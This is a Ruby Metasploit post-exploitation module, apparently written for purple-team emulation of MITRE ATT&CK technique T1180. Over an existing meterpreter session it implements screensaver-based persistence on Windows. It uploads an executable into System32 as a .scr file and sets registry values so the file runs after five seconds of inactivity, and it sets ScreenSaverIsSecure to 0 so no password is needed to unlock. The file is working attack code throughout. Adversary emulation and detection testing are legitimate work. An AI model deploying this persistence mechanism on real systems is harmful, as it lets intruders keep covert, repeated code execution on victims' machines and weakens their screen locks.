##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  # BASE_KEY="HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"


  def initialize(info={})
    super(update_info(info,
        'Name'          => 'T1180 Screensaver',
        'Description'   => %q{ Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. [1] The Windows screensaver application scrnsave.exe is located in C:\Windows\System32\ along with screensavers included with base Windows installations. The following screensaver settings are stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to achieve persistence:

    SCRNSAVE.exe - set to malicious PE path
    ScreenSaveActive - set to '1' to enable the screensaver
    ScreenSaverIsSecure - set to '0' to not require a password to unlock
    ScreenSaverTimeout - sets user inactivity timeout before screensaver is executed

Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. [2] },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptBool.new("CLEANUP", [true, "Remove registry changes and delete screensaver", false])
      ])
  end

  def reg_setvaldata_wrapper(basekey, exe, num, type)
    print_status("Setting #{basekey}\\#{exe} to #{num} with type #{type}")
    registry_setvaldata(basekey, exe, num, type)
  end

  def run
    begin
      raise "Module requires meterpreter session" unless session.type == "meterpreter"


      # upload file
      remote_file_path = "C:\\Windows\\System32\\t1180.scr"
      print_status("Uploading t1180.exe to #{remote_file_path}")
      upload_file(remote_file_path, "data/purple/t1180/t1180.exe")

      base_key = "HKCU\\Control Panel\\"
      reg_name = "Desktop"
      reg_setvaldata_wrapper(base_key + reg_name, "SCRNSAVE.exe", "c:\\Windows\\System32\\t1180.scr", "REG_SZ")
      reg_setvaldata_wrapper(base_key + reg_name, "ScreenSaveActive", "1", "REG_SZ")
      reg_setvaldata_wrapper(base_key + reg_name, "ScreenSaverIsSecure", "0", "REG_SZ")
      reg_setvaldata_wrapper(base_key + reg_name, "ScreenSaverTimeout", "5", "REG_SZ")
      print_warning("Keys have been changed, reboot and logon and then wait...")
      if datastore['CLEANUP']
        print_warning("Cleaning up. Did you check for persistence?")
        registry_deleteval(base_key + reg_name, "SCRNSAVE.exe")
        registry_deleteval(base_key + reg_name, "ScreenSaverIsSecure")
        registry_deleteval(base_key + reg_name, "ScreenSaverTimeout")
        register_files_for_cleanup("C:\\Windows\\System32\\t1180.scr")
      end

      print_good("Module T1180W execution complete.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1180W execution failed.")
    end
  end
end
